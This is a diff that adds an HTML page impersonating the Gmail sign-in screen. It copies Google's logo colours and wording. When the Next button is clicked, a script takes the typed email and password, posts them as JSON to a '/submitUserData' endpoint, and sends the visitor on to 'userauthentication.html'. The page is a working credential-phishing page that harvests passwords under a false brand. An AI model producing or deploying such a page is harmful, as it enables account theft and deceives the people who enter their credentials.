@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        form {
+            width: 400px;
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #0a77dd;
+            margin-bottom: 30px;
+        }
+
+        h4 {
+            margin-top: 0;
+            color: #333;
+        }
+
+        h5 {
+            color: #555;
+            margin-top: 5px;
+        }
+
+        #fieldset {
+            border: none; /* Remove border */
+            padding: 0; /* Remove padding */
+            text-align: left;
+        }
+
+        
+        #fieldset_a{
+            border: none; /* Remove border */
+            padding: 0; /* Remove padding */
+            text-align: left;
+        }
+
+
+        #legend {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+            transition: color 0.3s ease-in-out;
+        }
+
+        
+        #legend_a{
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+            transition: color 0.3s ease-in-out;
+        }
+
+        #email {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+            border: 1px solid #ddd; /* Add border to the input for visual separation */
+            border-radius: 5px;
+            transition: border-color 0.3s ease-in-out;
+        }
+
+        #Password{
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+            border: 1px solid #ddd; /* Add border to the input for visual separation */
+            border-radius: 5px;
+            transition: border-color 0.3s ease-in-out;
+        }
+
+        #email:focus {
+            border-color: #0a77dd;
+        }
+        
+        #Password:focus{
+            border-color: #0a77dd;
+           }
+        
+
+        a {
+            color: #0a77dd;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        p {
+            color: #555;
+            margin-top: 5px;
+        }
+
+        input[type="button"] {
+            background-color: #0a77dd;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            
+        }
+
+        input[type="button"]:hover {
+            background-color: #085fad;
+        }
+    </style>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var emailInput = document.getElementById("email");
+            var legend = document.getElementById("legend");
+            var legend_a=document.getElementById("legend_a");
+            var passwordInput=document.getElementById("Password");
+            
+
+            emailInput.addEventListener("focus", function () {
+                legend.style.color = "#0a77dd";
+                emailInput.style.borderColor = "#0a77dd";
+            });
+
+            passwordInput.addEventListener("focus", function () {
+                legend_a.style.color = "#0a77dd";
+                passwordInput.style.borderColor = "#0a77dd";
+            });
+
+
+            emailInput.addEventListener("blur", function () {
+                legend.style.color = "#333";
+                emailInput.style.borderColor = "#ddd";
+            });
+
+            passwordInput.addEventListener("blur", function () {
+                legend_a.style.color = "#333";
+                passwordInput.style.bordeColor = "#ddd";
+            });
+
+        });
+    </script>
+</head>
+
+<body>
+    <form>
+
+        <h2>
+            <span style="color: #0a77dd;">G</span><span style="color:#a52a2a">o</span><span style="color:#ffe600">o</span><span style="color:#0a77dd">g</span><span style="color:green">l</span><span style="color:#a52a2a">e</span>
+        </h2>
+
+        <h4>Sign in</h4>
+        <h5>to continue to Gmail</h5>
+
+        <fieldset id="fieldset">
+            <legend id="legend">Email or phone</legend>
+            <input type="text" id="email" name="email" required>
+            
+        </fieldset>
+
+        <fieldset id="fieldset_a">
+            <legend id="legend_a">Password</legend>
+            <input type="password" id="Password" name="password" required>
+        </fieldset>
+
+        <a href="#" style="color:#0a77dd;text-decoration:none;">Forgot email</a>
+
+        <p>Not your computer? Use Guest mode to sign in privately.
+            <a href="#" style="color:#0a77dd;text-decoration:none;font-weight:bold;">Learn more about using Guest mode</a>
+        </p>
+
+        
+    <a href="#" style="color:#0a77dd;text-decoration:none;font-weight:bold;">Create account</a><br>
+    
+<a href="javascript:void(0)" onclick="handleClick()">
+    <input type="button" value="Next" id="bunde">
+</a>
+    <script>
+function handleClick(){
+    submitForm();
+    window.location.replace("userauthentication.html");
+}
+    </script>
+
+    </form>
+
+
+
+    <script>
+        function submitForm() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("Password").value;
+    
+            var userData = {
+                email: email,
+                password: password
+            };
+    
+            var serverEndpoint = '/submitUserData';
+    
+            fetch(serverEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(userData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Server response:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    
+        </script>
+
+
+</body>
+
+</html>
